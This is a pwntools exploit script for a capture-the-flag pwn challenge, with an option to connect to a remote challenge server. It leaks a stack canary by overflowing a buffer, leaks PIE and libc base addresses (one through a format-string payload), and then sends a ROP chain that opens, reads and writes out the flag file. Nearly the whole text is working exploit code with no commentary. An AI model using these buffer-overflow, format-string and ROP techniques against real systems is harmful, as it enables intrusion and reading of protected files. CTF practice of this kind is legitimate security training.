from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

file_name = './pwn_patched'
libc_name = './libc.so.6'

elf = ELF(file_name)
context.binary = elf
libc = ELF(libc_name)

gdb_   = 1 if ('gdb' in sys.argv)        else 0
switch = 1 if ('remote' in sys.argv)     else 0
debug  = 0 if ('deoff'  in sys.argv)     else 1
error  = 1 if ('error'  in sys.argv)     else 0

if debug:
    context(log_level='debug')

if error:
    context(log_level='error')

bps = [
# 0x1234,
# 'main',
# (0xe3b31, 'libc'), 
# ('system', 'libc')
]

gdb_cmd = ''
if gdb_ and switch == 0: 
    gdb_cmd += "set breakpoint pending on\n"
    for b in bps:
        if isinstance(b, int):
            gdb_cmd += f"b *$rebase({hex(b)})\n"
        elif isinstance(b, str):
            gdb_cmd += f"b {b}\n"
        elif isinstance(b, tuple) and len(b) == 2 and b[1] == 'libc':
            if 'libc' in locals() and libc:
                target = libc.sym[b[0]] if isinstance(b[0], str) else b[0]
                gdb_cmd += f'b *($base("libc") + {hex(target)})\n'
            else:
                log.warning("未加载 Libc,跳过 Libc 断点")
    gdb_cmd += "c\n" 

if switch:
    target = 'nc1.ctfplus.cn'
    port   =  29837
    p = remote(target, port)
elif gdb_: 
    p = gdb.debug(file_name, gdbscript=gdb_cmd, aslr=True)
else:
    p = process(file_name)

def s(data):             return p.send(data)
def sa(delim, data):     return p.sendafter(delim, data)
def sl(data):            return p.sendline(data)
def sla(delim, data):    return p.sendlineafter(delim, data)
def r(numb=4096):        return p.recv(numb)
def ru(delim, drop=True):return p.recvuntil(delim, drop)
def rl():                return p.recvline()
def ra(t=None):          return p.recvall(timeout=t)
def cl():                return p.close()
def it():                return p.interactive()
def uc64(data):          return u64(data.rjust(8, b'\x00'))
def uu64(data):          return u64(data.ljust(8, b'\x00'))
def a(f, off=libc):      return lg(hex(off), (ret := f.address + off)) or ret
def lg(name, data):      return log.success(name + ': ' + (hex(data) if isinstance(data, int) else data.decode(errors='ignore') if isinstance(data, bytes) else str(data)))
def menu(idx, pmt=b'>'): return sla(pmt, str(idx).encode())
def ga(delim=b'|', name='Leak'):      return [lg(f'{name}[{i}]', x) or x for i, x in enumerate([int(a, 16) for a in re.findall(b'0x[0-9a-fA-F]+', ru(delim))])]
def ntlb(leak, offset, name='Libc'):  return setattr(libc, 'address', leak - (libc.sym[offset] if isinstance(offset, str) else offset)) or lg(name, libc.address)
def ntpie(leak, offset, name='PIE'):  return setattr(elf, 'address', leak - (elf.sym[offset] if isinstance(offset, str) else offset)) or lg(name, elf.address)
def fill(num, content=b'A'):          return (content.encode() if isinstance(content, str) else content) * num
def se(s, f=None):                    return lg(s if isinstance(s, str) else f"bytes: {s.hex()}", (addr := next((f or libc).search(s if isinstance(s, bytes) else s.encode())))) or addr

_rop_cache = {}
def gg(s, f=None):
    target = f or libc
    if target not in _rop_cache:
        _rop_cache[target] = ROP(target)
    rop = _rop_cache[target]
    instrs = [x.strip() for x in s.split(';')]
    gadget = rop.find_gadget(instrs)
    if gadget:
        addr = gadget.address
        lg(s, addr) 
        return addr
    else:
        raise ValueError(f"[-] Critical: Gadget not found: {s}")
    
#################################################################################
payload1 = flat([
    fill(0x28), 
    b"B"
])
sa(b'data:', payload1)
ru(b'B')
canary1 = r(7)
canary = uc64(canary1)
lg("canary", canary)

payload2 = flat([
    fill(0x28),
    canary,
    fill(0x8),
    p8(0x92)
])
sa(b'logs:',payload2)

payload3 = flat([
    fill(0x38)
])
sa(b'data:', payload3)
ru(b"A"*0x38)
leak = r(6)
ntpie(uu64(leak),0x1497)
function1 = a(elf,0x11e3)

payload4 = flat([
    fill(0x28),
    canary,
    fill(0x8),
    function1
])
sa(b'logs:',payload4)

sa(b'data:',b"%10$p|")
leaklibc = ga()
ntlb(leaklibc[0],0x27675)

payload5 = flat([
    fill(0x8),
    canary,
    fill(0x8),
    elf.address+0x1492
])
s(payload5)

sa(b'data:',b'A')
flag_addr = se("./flag",elf)
prdi = gg("pop rdi;ret")
prsi = gg("pop rsi;ret")
prdx = se(asm("pop rdx ; xor eax, eax ; ret"))
prax = gg('pop rax;ret')
syscall = gg('syscall;ret')
bss_addr = elf.bss() + 0x100
payload4 = flat([
    fill(0x28),
    canary,
    fill(0x8),
    prdi, flag_addr,   
    prsi, 0,           
    prdx, 0,  
    prax, 2,     
    syscall,            
    
    prdi, 3,          
    prsi, bss_addr,     
    prdx, 0x100,   
    libc.sym['read'],     
    
    prdi, 1,            
    prsi, bss_addr,
    prdx, 0x100,
    libc.sym['write']
])
sa(b'logs:',payload4)

it()
